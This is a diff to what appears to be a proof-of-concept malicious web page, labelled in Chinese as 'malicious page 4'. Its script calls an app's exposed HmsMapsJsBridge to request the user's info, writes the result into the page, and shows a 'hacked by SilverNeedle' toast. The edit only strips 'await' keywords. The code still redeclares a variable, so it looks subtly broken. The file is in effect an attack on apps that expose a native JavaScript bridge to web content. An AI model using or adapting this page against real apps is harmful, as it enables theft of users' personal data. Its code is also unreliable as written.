@@ -26,10 +26,10 @@
             var hack = function() {
                 try {
                     let str1 = "{'type':'getUserInfo', 'msgId':10086}";
-                    let ret = await window.HmsMapsJsBridge.postMessage(str1);
+                    let ret = window.HmsMapsJsBridge.postMessage(str1);
                     document.getElementById("text").innerText = ret;
                     let str2 = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
-                    let ret = await window.HmsMapsJsBridge.postMessage(str2);
+                    let ret = window.HmsMapsJsBridge.postMessage(str2);
                 } catch (error) {
                     console.error('执行出错', error);
                     alert('执行出错' + error.message);
@@ -43,6 +43,6 @@
     </script>
 </head>
 <body>
-    <h1 id="text">恶意页面 3</h1>
+    <h1 id="text">恶意页面 4</h1>
 </body>
 </html>
